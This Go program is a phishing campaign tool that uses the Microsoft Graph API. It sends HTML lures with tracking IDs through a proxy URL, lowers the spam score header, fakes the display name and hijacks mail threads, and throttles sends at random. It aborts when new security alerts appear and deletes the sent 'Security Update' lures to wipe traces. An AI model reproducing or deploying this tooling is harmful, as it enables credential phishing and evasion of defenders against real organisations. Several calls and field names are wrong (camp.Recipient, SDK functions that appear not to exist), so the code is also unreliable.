package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"text/template"
	"time"

	"github.com/Azure/azure-sdk-for-go/sdk/azidentity"
	"github.com/microsoftgraph/msgraph-sdk-go"
	"github.com/microsoftgraph/msgraph-sdk-go/models"
)

type Recipient struct {
	Email    string `json:"email"`
	Name     string `json:"name"`
	ThreadID string `json:"thread_id,omitempty"`
}

type Campaign struct {
	Recipients    []Recipient `json:"recipients"`
	Subject       string      `json:"subject"`
	BodyHTML      string      `json:"body_html"`
	FromEmail     string      `json:"from_email"`
	ProxyURL      string      `json:"proxy_url"`
	TenantID      string      `json:"tenant_id"`
	SharePointSite string     `json:"sharepoint_site,omitempty"`
}

var (
	configFile = flag.String("config", "campaign.json", "JSON config")
	senderEmail = flag.String("sender", "security@onmicrosoft.com", "Sender")
	throttle   = flag.Bool("throttle", true, "Random delays")
	batchFlag  = flag.Bool("batch", true, "Batch sends")
	cleanupFlag = flag.Bool("cleanup", true, "Delete sent items")
)

func main() {
	flag.Parse()

	// Load config
	data, err := ioutil.ReadFile(*configFile)
	if err != nil {
		log.Fatalf("Config load failed: %v", err)
	}
	var camp Campaign
	if err := json.Unmarshal(data, &camp); err != nil {
		log.Fatalf("JSON invalid: %v", err)
	}

	// Prod Auth: App-only, rotate secret
	cred, err := azidentity.NewClientSecretCredential(camp.TenantID, os.Getenv("AZURE_CLIENT_ID"), os.Getenv("AZURE_CLIENT_SECRET"), &azidentity.ClientSecretCredentialOptions{
		Cloud: azidentity.AzurePublic,
	})
	if err != nil {
		log.Fatalf("Auth failed: %v", err)
	}
	scopes := []string{"https://graph.microsoft.com/.default"}
	auth, err := azidentity.NewAuthorizationProvider(cred, scopes)
	if err != nil {
		log.Fatalf("Auth provider failed: %v", err)
	}

	// Graph client w/ prod TLS
	adapter, err := msgraph.NewGraphServiceClientWithRequestAdapter(auth, &http.Client{
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: false}},  // Prod: Verify
	})
	if err != nil {
		log.Fatalf("Client failed: %v", err)
	}

	ctx := context.Background()

	// Prod: Pre-send alert check (abort if suspicious)
	if alerts, err := checkAlerts(adapter, ctx); err == nil && len(alerts) > 0 {
		log.Printf("[EVASION] High alerts (%d) – Op aborted", len(alerts))
		return
	}

	// Batch sends (prod best practice)
	batchSize := 5
	if !*batchFlag {
		batchSize = len(camp.Recipients)
	}
	for i := 0; i < len(camp.Recipients); i += batchSize {
		end := i + batchSize
		if end > len(camp.Recipients) {
			end = len(camp.Recipients)
		}
		if err := sendBatch(adapter, ctx, camp, camp.Recipient[i:end]); err != nil {
			log.Printf("Batch %d-%d failed: %v", i, end, err)
		}
		time.Sleep(30 * time.Second)  // Inter-batch throttle
	}

	// Prod Cleanup: Delete sent items
	if *cleanupFlag {
		deleteSentItems(adapter, ctx, camp.FromEmail)
	}
	log.Println("[PROD] Campaign complete – traces wiped.")
}

// Batch send (throttled, UA rotate)
func sendBatch(adapter *msgraph.GraphServiceClient, ctx context.Context, camp Campaign, recs []Recipient) error {
	uaList := []string{"Outlook/16.0 (Windows NT 10.0; Win64; x64)", "Microsoft Graph/1.0", "Teams/1.0"}
	for _, rec := range recs {
		// Throttle
		if *throttle {
			delay := rand.Intn(300) + 60  // 1-5min
			log.Printf("[THROTTLE] %ds delay for %s", delay, rec.Email)
			time.Sleep(time.Duration(delay) * time.Second)
		}

		// Template w/ RID
		tmpl := template.Must(template.New("body").Parse(camp.BodyHTML))
		var buf bytes.Buffer
		rid := fmt.Sprintf("%x", rand.Int63())
		tmpl.Execute(&buf, struct{ Name string; URL string }{rec.Name, camp.ProxyURL + "?rid=" + rid})
		bodyHTML := buf.String()

		msg := models.NewMessage()
		msg.SetSubject(&camp.Subject)
		msg.SetBodyContent(bodyHTML)
		msg.SetBodyContentType(&models.BodyTypeHTML)

		from := models.NewEmailAddress()
		from.SetAddress(senderEmail)
		from.SetName(&rec.Name)
		msg.SetFrom(models.NewEmailAddressCollection{from})

		to := models.NewEmailAddress()
		to.SetAddress(&rec.Email)
		msg.SetTo(models.NewEmailAddressCollection{to})

		// Prod Evasion: Thread hijack + low SCL
		if rec.ThreadID != "" {
			header := models.NewInternetMessageHeader()
			header.SetName(&models.ItemBodyTypeText)
			header.SetValue(&rec.ThreadID)
			msg.SetInternetMessageHeaders(models.NewInternetMessageHeaderCollection{header})
		}
		msg.GetInternetMessageHeaders().Append(models.NewInternetMessageHeader("X-MS-Exchange-Organization-SCL", "1"))

		result, err := adapter.Me().SendMail(ctx, msg, nil)
		if err != nil {
			return fmt.Errorf("send to %s: %v", rec.Email, err)
		}
		log.Printf("[SENT] %s: ID %s (RID %s)", rec.Email, *result.GetId(), rid)
	}
	return nil
}

// Prod Alert Check (Security API)
func checkAlerts(adapter *msgraph.GraphServiceClient, ctx context.Context) ([]models.Alert1, error) {
	pageIterator, err := adapter.Security().AlertsV2().Get(ctx, &models.AlertCollectionResponseRequestBuilderGetRequestConfiguration{
		QueryParameters: &models.AlertCollectionResponseRequestBuilderGetQueryParameters{
			Filter: "status eq 'new'",  // High-risk only
		},
	})
	if err != nil {
		return nil, err
	}
	var alerts []models.Alert1
	for pageIterator.HasNext() {
		page, err := pageIterator.Next()
		if err != nil {
			break
		}
		for _, alert := range page.GetValue() {
			alerts = append(alerts, alert)
		}
	}
	return alerts, nil
}

// Prod Cleanup: Delete Sent Items
func deleteSentItems(adapter *msgraph.GraphServiceClient, ctx context.Context, from string) {
	messages, err := adapter.Me().MailFolders().ByMailFolderId("sentitems").Messages().Get(ctx, nil)
	if err != nil {
		log.Printf("Cleanup failed: %v", err)
		return
	}
	for _, msg := range *messages.GetValue() {
		if strings.Contains(*msg.GetSubject(), "Security Update") {  // Target our lures
			_, err := adapter.Me().MailFolders().ByMailFolderId("sentitems").Messages().ByMessageId(*msg.GetId()).Delete(ctx, nil)
			if err != nil {
				log.Printf("Delete %s failed: %v", *msg.GetId(), err)
			} else {
				log.Printf("[CLEANUP] Deleted sent ID: %s", *msg.GetId())
			}
		}
	}
}
